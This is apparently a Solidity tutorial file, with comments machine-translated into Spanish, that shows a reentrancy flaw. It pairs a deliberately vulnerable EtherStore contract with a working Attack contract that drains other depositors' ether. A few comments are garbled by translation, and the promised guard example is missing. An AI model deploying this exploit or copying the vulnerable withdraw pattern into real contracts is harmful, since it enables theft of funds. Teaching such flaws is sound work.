// Vulnerability
// Let's say that contract A calls contract B.

//Digamos que el contrato A llama al contrato B.
El exploit de reentrada permite que B vuelva a llamar a A antes de que A finalice la ejecución.

/*
EtherStore es un contrato donde puede depositar y retirar ETH.
Este contrato es vulnerable al ataque de reingreso.
Veamos por qué.

1. Implementar EtherStore
2. Deposite 1 Ether de la Cuenta 1 (Alice) y de la Cuenta 2 (Bob) en EtherStore
3. Implementar ataque con dirección de EtherStore
4. Llame a Attack.attack enviando 1 ether (usando la cuenta 3 (Eve)).
   Recibirás 3 Ether de vuelta (2 Ether robados de Alice y Bob,
   más 1 Ether enviado de este contrato).

¿Qué pasó?
Attack pudo llamar a EtherStore.withdraw varias veces antes
EtherStore.withdraw terminó de ejecutarse.

Así es como se llamaron las funciones.
- Ataque.ataque
- EtherStore.depósito
- EtherStore.retirar
- Ataque alternativo (recibe 1 Ether)
- EtherStore.retirar
- Attack.fallback (recibe 1 Ether)
- EtherStore.retirar
- Ataque alternativo (recibe 1 Ether)


*/
pragma solidity ^0.8.17;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

// Función de ayuda para verificar el saldo de este contrato
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
/*
Técnicas Preventivas

Asegúrese de que se produzcan todos los cambios de estado antes de llamar a los contratos externos
Use modificadores de funciones que eviten el reingreso
Aquí hay un ejemplo de un guardia de reingreso
*/
